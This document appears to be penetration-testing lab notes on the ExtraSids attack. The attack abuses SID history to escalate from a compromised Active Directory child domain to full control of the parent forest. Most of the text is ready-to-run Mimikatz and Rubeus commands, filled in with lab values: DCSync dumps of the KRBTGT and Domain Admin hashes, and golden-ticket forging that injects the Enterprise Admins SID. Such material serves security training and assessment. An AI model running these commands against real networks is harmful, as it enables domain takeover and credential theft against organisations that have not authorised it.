## Checking SIDHistory


```
Import-Module .\PowerView.ps1
Get-DomainUser -Identity <username> -Properties sidhistory
```


### ExtraSids Attack (Golden Ticket + SID History Abuse)

This attack chains **child domain compromise → parent domain takeover** within the same AD forest by abusing the trust relationship and lack of SID filtering between domains in the same forest.

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

## Obtaining the KRBTGT Account's NT Hash using Mimikatz

```ruby
mimikatz.exe
```
```ruby
lsadump::dcsync /user:LOGISTICS\krbtgt
```


We can use the PowerView `Get-DomainSID` function to get the SID for the child domain, but this is also visible in the Mimikatz output above.


```ruby
Get-DomainSID
```


Next, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. We could also do this with the [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) cmdlet with a command such as `Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`.


```ruby
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

At this point, we have gathered the following data points:

- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
- The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: `hacker`
- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

## Creating a Golden Ticket with Mimikatz

```ruby
mimikatz.exe
```
```ruby
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

#### Confirming a Kerberos Ticket is in Memory Using klist

```ruby
klist
```

From here, it is possible to access any resources within the parent domain, and we could compromise the parent domain in several ways.


---


## ExtraSids Attack - Rubeus


#### Creating a Golden Ticket using Rubeus

```ruby
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

Once again, we can check that the ticket is in memory using the `klist` command.

Finally, we can test this access by performing a DCSync attack against the parent domain, targeting the `lab_adm` Domain Admin user.

```ruby
mimikatz.exe
```
```ruby
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

